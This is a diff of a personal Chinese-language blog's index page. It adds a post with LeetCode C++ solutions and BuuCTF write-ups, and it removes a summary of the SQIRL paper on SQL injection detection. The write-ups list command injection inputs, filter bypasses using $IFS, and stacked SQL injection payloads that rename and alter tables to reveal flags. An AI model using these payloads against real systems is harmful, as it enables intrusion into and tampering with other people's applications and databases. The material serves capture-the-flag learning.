@@ -73,6 +73,145 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-20240214" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/14/20240214/" class="article-date">
+  <time class="dt-published" datetime="2024-02-14T10:04:59.000Z" itemprop="datePublished">2024-02-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/02/14/20240214/">20240214</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h5><p>使用暴力枚举，枚举数组中的每一个数 x，寻找数组中是否存在 target - x。</p>
+<p>当我们使用遍历整个数组的方式寻找 target - x 时，需要注意到每一个位于 x 之前的元素都已经和 x 匹配过，因此不需要再进行匹配。而每一个元素不能被使用两次，所以我们只需要在 x 后面的元素中寻找 target - x。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        vector &lt;<span class="type">int</span>&gt; v;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>()<span class="number">-1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;nums.<span class="built_in">size</span>();j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)</span><br><span class="line">                &#123;</span><br><span class="line">                    v = &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h5><p>思路：</p>
+<ul>
+<li><p>将数字转换为字符串，并检查字符串是否为回文。但是，这需要额外的非常量空间来创建问题描述中所不允许的字符串。</p>
+</li>
+<li><p>将数字本身反转，然后将反转后的数字与原始数字进行比较，如果它们是相同的，那么这个数字就是回文</p>
+</li>
+</ul>
+<p>我选择用循环，判断对称位的数是否相等</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(x&gt;=<span class="number">0</span> &amp;&amp; x&lt;<span class="number">10</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> n=<span class="built_in">ws</span>(x);</span><br><span class="line">            <span class="type">int</span> sz[n];</span><br><span class="line">            <span class="type">int</span> num=x;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                sz[i]=num%<span class="number">10</span>;</span><br><span class="line">                num=num/<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n/<span class="number">2</span>;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(sz[i]!=sz[n-i<span class="number">-1</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">ws</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            n++;</span><br><span class="line">            x=x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="删除有序数组中的重复项"><a href="#删除有序数组中的重复项" class="headerlink" title="删除有序数组中的重复项"></a>删除有序数组中的重复项</h5><p>循环，删除重复项</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(i=len<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==nums[i<span class="number">-1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                nums.<span class="built_in">erase</span>(nums.<span class="built_in">begin</span>()+i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="5、Exec"><a href="#5、Exec" class="headerlink" title="5、Exec"></a>5、Exec</h5><p>Linux ping 命令用于检测主机。执行 ping 指令会使用 ICMP 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常</p>
+<p>ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p>
+<p>cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上</p>
+<p>首先查看此文件的目录：127.0.0.1|ls</p>
+<p>点击ping后发现有个index.php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ed432b5-3a25-47e5-a5d8-fa4e3948b9ba" alt="image"></p>
+<p>再查看上级目录：127.0.0.1|ls &#x2F;</p>
+<p>点击ping后可以看到一个flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0d1134f8-a13d-495a-aee7-8cf77a4b70df" alt="image"></p>
+<p>查看flag：127.0.0.1|cat &#x2F;flag</p>
+<p>得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/82ff4a13-d4da-43e8-bc7e-9b7cf5acf0f9" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4504f6f2-191b-410b-b40d-18b4e403a271&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="6、Ping-Ping-Ping"><a href="#6、Ping-Ping-Ping" class="headerlink" title="6、Ping Ping Ping"></a>6、Ping Ping Ping</h5><p>这一题与上一题Exec类似，首先访问本地地址，发现有显示</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22516845-102d-4d83-b285-1b77da5f6ece" alt="image"></p>
+<p>查看此文件的目录，发现有两个文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7d100ccc-5cf4-4e39-b61e-5cf2b2dc48f6" alt="image"></p>
+<p>查看flag.php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/4a1777df-77fb-4867-a0c5-6af4f22783c8" alt="image"></p>
+<p>它说空格被过滤了</p>
+<p>命令中空格被过滤的解决方法：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt: $IFS$9 $9指传过来的第9个参数</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg (\x20转换成字符串就是空格)</span><br></pre></td></tr></table></figure>
+
+<p>发现符号又被过滤了，说明<code>&#123;&#125;</code>大括号被过滤了</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/edc798c1-1d33-40e5-ba2d-3044ba3e2d10" alt="image"></p>
+<p>用另一个方法试下index.php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/614c2964-8a82-41be-b50c-51b4d29bc50e" alt="image"></p>
+<p>有一个参数a，<strong>变量拼接字符串——将a的值覆盖，然后进行绕过</strong></p>
+<p>构造payload：<code>/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
+<p>用变量拼接成flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1db4f885-23d5-40b5-9d8a-291a10eae7f6" alt="image"></p>
+<p>啥也没有，查看源代码，得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8ea1b222-1b2e-420a-8a81-137e674b2caf" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;97aede41-9723-4901-8ac2-b345d66af44b&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="7、随便注"><a href="#7、随便注" class="headerlink" title="7、随便注"></a>7、随便注</h5><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1fe10469-06c6-4c22-87f0-1a3886b61577" alt="image"></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0cd3e27d-e133-4673-bcc7-2d008ce22b09" alt="image"></p>
+<p>查询3时没有显示，说明有两个字段</p>
+<p>爆数据库：1’;show databases;#</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d0f5ed71-751c-4117-9195-f3178caa3dd2" alt="image"></p>
+<p>爆表名：1’; show tables;#</p>
+<p>出来了两个表</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f636bbac-e56c-4091-bf74-ebe0f39634cf" alt="image"></p>
+<p>查看words表列名：1’; show columns from words;#</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6bdf874f-d98f-49ee-a0e6-b5a1df7495b0" alt="image"></p>
+<p>查看1919810931114514表列名：0’; show columns from <code>1919810931114514</code>;#</p>
+<p>注意：表名为数字时，要用反引号包起来查询</p>
+<p>看到flag，说明表1919810931114514中有flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1be25d80-699d-4449-981a-4ba85f3228b3" alt="image"></p>
+<p>查看大佬的方法</p>
+<ul>
+<li><p>通过 rename 先把 words 表改名为其他的表名。</p>
+</li>
+<li><p>把 1919810931114514 表的名字改为 words 。</p>
+</li>
+<li><p>给新 words 表添加新的列名 id 。</p>
+</li>
+<li><p>将 flag 改名为 data </p>
+<p>1’; rename table words to word1; rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/595a5ad4-0393-4542-9b16-f32cd7633903" alt="image"></p>
+</li>
+</ul>
+<p>最后输入：1’ or 1&#x3D;1;#</p>
+<p>得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b2b3bcda-a630-4c63-a614-a68ba770a02a" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa75e48d-8389-408e-9c8c-9d30c81c432b&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="8、EasySQL"><a href="#8、EasySQL" class="headerlink" title="8、EasySQL"></a>8、EasySQL</h4><p>输入1，有显示</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/24aa574b-2e43-454e-8df1-8dbb3b104abd" alt="image"></p>
+<p>爆数据库：1;show databases;#</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0320260a-c0f9-4e36-b544-bb0ba53de8a0" alt="image"></p>
+<p>爆表：1;show tables;#</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ee2d1ebd-03b9-48f9-984f-10acee8da107" alt="image"></p>
+<p>爆字段：1;show columns from FLAG;#</p>
+<p>显示Nonono</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faaaf7dd-fd3e-4fe1-8eb9-2c66d9b23046" alt="image"></p>
+<p>查看大佬博客后，构造payload：*,1</p>
+<p>参考博客（[BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120188186">SUCTF 2019]EasySQL1__Monica_的博客-CSDN博客</a>）</p>
+<p>得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9321cfe6-b625-4707-9703-8ecbdf5d1a9b" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c0c6069-c1fe-4314-b793-9a214f11fdb3&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/14/20240214/" data-id="clsl9y38e0000usvf69u7b5aa" data-title="20240214" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Paper-IvySyn Automated Vulnerability Discovery in Deep Learning Frameworks" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/" class="article-date">
@@ -1038,107 +1177,6 @@
 
 
   
-    <article id="post-Paper-SQIRL Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/01/27/Paper-SQIRL%20Grey-Box%20Detection%20of%20SQL%20Injection%20Vulnerabilities%20Using%20Reinforcement%20Learning/" class="article-date">
-  <time class="dt-published" datetime="2024-01-27T13:10:28.000Z" itemprop="datePublished">2024-01-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/01/27/Paper-SQIRL%20Grey-Box%20Detection%20of%20SQL%20Injection%20Vulnerabilities%20Using%20Reinforcement%20Learning/">SQIRL</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="SQIRL-Grey-Box-Detection-of-SQL-Injection-Vulnerabilities-Using-Reinforcement-Learning-论文分享"><a href="#SQIRL-Grey-Box-Detection-of-SQL-Injection-Vulnerabilities-Using-Reinforcement-Learning-论文分享" class="headerlink" title="SQIRL: Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning 论文分享"></a>SQIRL: Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning 论文分享</h3><p>Wahaibi, S. A., Foley, M., &amp; Maffeis, S. (2023). SQIRL: Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning. <em>32nd USENIX Security Symposium (USENIX Security 23)</em>, 6097–6114.</p>
-<p>pdf链接：<a href="">usenix.org&#x2F;system&#x2F;files&#x2F;usenixsecurity23-al-wahaibi.pdf</a></p>
-<p>SQIRL：使用强化学习的SQL注入漏洞灰盒检测</p>
-<p>SQIRL是一种基于深度强化学习，使用多个工作代理和灰盒反馈来检测SQL注入漏洞的新方法，使用单个代理来学习如何修正SQL语法、转义上下文和绕过sanitisation。</p>
-<h5 id="现存的SQL注入漏洞扫描器局限"><a href="#现存的SQL注入漏洞扫描器局限" class="headerlink" title="现存的SQL注入漏洞扫描器局限"></a>现存的SQL注入漏洞扫描器局限</h5><ol>
-<li>漏洞扫描器通常用于在投入生产之前找到漏洞，但是它们有时依赖于错误处理和网页上的SQL查询的反馈，导致在不存在错误时的有效性不高</li>
-<li>现有的扫描器使用简单的基于规则的方法来覆盖最常见的SQL注入有效载荷，但是这些有效载荷缺乏多样性，并且无法根据特定的网络应用程序来制定有效载荷，导致扫描器忽略了合法的漏洞</li>
-</ol>
-<h5 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h5><p>如何生成针对每个注入点、特定上下文和防御的有效载荷</p>
-<h5 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h5><ol>
-<li><p>为代理实现一个强化学习(RL)环境，为SQL注入模糊Web应用程序，通过我们扩展的最先进的爬虫识别输入。</p>
-</li>
-<li><p>设计并实现了SQIRL，一种新的深度强化学习模糊方法。单个RL代理完成SQL注入的三项任务：语法修复、上下文转义和清理旁路，并且让这些工作在知识在代理之间共享。</p>
-</li>
-</ol>
-<h5 id="强化学习-RL"><a href="#强化学习-RL" class="headerlink" title="强化学习(RL)"></a>强化学习(RL)</h5><p>强化学习的主要思想是通过与环境的交互，基于奖励和惩罚来学习如何最好地完成任务，以实现长期累积奖励的最大化。在这个过程中，智能体通过尝试不同的行为，并根据获得的奖励和惩罚来调整自己的策略，以最大化长期累积奖励。强化学习考虑的是长期累积奖励，而不仅仅是即时奖励，因此智能体需要学会通过一系列看似不相关的行为来最大化长期奖励。此外，智能体还需要在探索和利用之间找到平衡，以最大化长期奖励。强化学习通常使用马尔科夫决策过程（MDP）来建模决策问题，其中包括状态、动作、奖励和转移概率。通过学习价值函数或策略函数来决定在每个状态下应该采取什么样的行动，以最大化长期奖励。</p>
-<h5 id="联邦学习-FL"><a href="#联邦学习-FL" class="headerlink" title="联邦学习(FL)"></a>联邦学习(FL)</h5><p>联邦学习是多个客户端模型在一段时间内独立训练，将学习得到的参数发送给中央服务器模型，服务器模型对得到的参数进行汇总（通常是求平均值），然乎将汇总后的参数发送给客户端，客户端使用新的参数进行训练，直至模型收敛。</p>
-<h5 id="查找SQL注入漏洞的主要步骤"><a href="#查找SQL注入漏洞的主要步骤" class="headerlink" title="查找SQL注入漏洞的主要步骤"></a>查找SQL注入漏洞的主要步骤</h5><ol>
-<li>识别可能容易受到SQL注入影响的输入位置。包括URL、输入标签和与网页相关的动态链接元素。</li>
-<li>一旦找到输入位置，就可以制作相关的有效负载。</li>
-</ol>
-<p>有效负载必须满足4个标准才能触发SQL注入</p>
-<ul>
-<li><p>生成语法有效的SQL，以避免执行错误</p>
-</li>
-<li><p>转义预期的SQL上下文</p>
-</li>
-<li><p>绕过应用于有效负载的任何基于黑名单的过滤</p>
-</li>
-<li><p>更改SQL语句的预期行为。例如，假设没有过滤，表1中红色显示的有效载荷会转义’并执行SLEEP语句。</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0f058974-865d-4a4f-8cf1-29ff27da0e9e" alt="image"></p>
-</li>
-</ul>
-<h5 id="SQIRL实现"><a href="#SQIRL实现" class="headerlink" title="SQIRL实现"></a>SQIRL实现</h5><p>SQIRL架构</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3523614b-07ed-4d5d-968f-738f244d7148" alt="image"></p>
-<p><strong>RL环境</strong></p>
-<p>绿色部分是RL代理，计算当前有效载荷的突变。RL环境将Web应用程序抽象为RL代理，作为接受操作并返回观察结果的组件，它需要抓取Web应用程序和监控SQL数据库，提供反馈机制没允许代理学习如何定制SQL注入有效载荷。</p>
-<p><strong>SQl  Proxy</strong></p>
-<p>SQL代理从数据库日志文件中检索SQL语句，用于SQIRL的抓取和模糊阶段。</p>
-<p><strong>State &amp; Extrinsic Reward</strong></p>
-<p>时刻 t 的状态由三个不同的部分组成：在t−1时刻注入的有效载荷；在时间t−1时从SQL代理中提取的SQL语句(在出现错误且没有新的SQL语句的情况下，本文使用在t−2时捕获的SQL语句)；如果在前一个时间步骤中出现SQL错误，则使用bit来标记。为了减少可能状态的空间，并鼓励泛化，有效负载和SQL语句被转换为通用形式：字符串和整数值分别被通用令牌STR和INT替换。</p>
-<p>这部分涉及一个算法，用于计算奖励、终止条件和下一局的过渡函数。</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0603f880-5e98-45a9-93db-d8ce70260d10" alt="image"></p>
-<p>如果没有发生错误，检测有效载荷是否更改了SQL的行为，出发成功的终止条件并奖励0。假如，SLEEP关键字八日注入，并且在预期的上下文之外没有进行过滤，这就是一个合法的SQL注入有效载荷，但是如果有效负载无法逃离上下文，被清理，不改变已执行的SQL的行为或者导致SQL语法错误，提供-1的奖励。过度函数中的行为更改、清理和专业上下文条件作为合法检查和正则表达式实现。</p>
-<p><strong>Payload Control Module</strong></p>
-<p>本地代理通过有效载荷控制模块(PCM)与Web应用程序交互。PCM将一个动作转换为具体的有效载荷，并将其注入Web应用中，计算结果状态和奖励，反馈给相关代理。</p>
-<p>生成具体有效载荷的操作</p>
-<ul>
-<li>上下文转义：从有效载荷中添加或删除基本令牌，如’，#，1&#x3D;1，SELECT</li>
-<li>行为更改：从有效载荷中添加或删除行为更改令牌，如AND SLEEP(0)，WHERE SLEEP(0)，SLEEP(0)</li>
-<li>过滤转义：更改现有有效载荷令牌，如通过关键字大小写(SeLect)、字符令牌(CHAR(20))和注释空白</li>
-</ul>
-<p>这张表是SQL有效负载和语句的令牌空间</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/79a4be87-25ad-4d7c-aec9-ca270050aa6a" alt="image"></p>
-<p><strong>Local Worker</strong></p>
-<p>SQIRL的核心，包含处理操作、状态和执行主要学习任务的逻辑。</p>
-<p><strong>Global Agent</strong></p>
-<p>全局代理包含全局策略，使用代理从同一目标的独立互动中收集不同的行为</p>
-<p>SQIRL生成的有效载荷通用表示法</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ca145107-7404-4532-95c5-3fde1ab363f7" alt="image"></p>
-<h5 id="本文的局限性"><a href="#本文的局限性" class="headerlink" title="本文的局限性"></a>本文的局限性</h5><p>SQIRL使用SQL数据库中的信息，但无法访问网络应用程序的源代码，是一种灰盒工具，不需要依赖在网页上泄露错误信息就能发现漏洞，但是针对已部署网络应用程序的恶意行为无效。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/27/Paper-SQIRL%20Grey-Box%20Detection%20of%20SQL%20Injection%20Vulnerabilities%20Using%20Reinforcement%20Learning/" data-id="clrw3efvq0000ekvffk19eyta" data-title="SQIRL" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1189,6 +1227,10 @@
       <ul>
         
           <li>
+            <a href="/2024/02/14/20240214/">20240214</a>
+          </li>
+        
+          <li>
             <a href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/">IvySyn</a>
           </li>
         
@@ -1202,10 +1244,6 @@
         
           <li>
             <a href="/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/">RESOLVERFUZZ</a>
-          </li>
-        
-          <li>
-            <a href="/2024/02/01/Web-SQLi1/">SQLi1</a>
           </li>
         
       </ul>
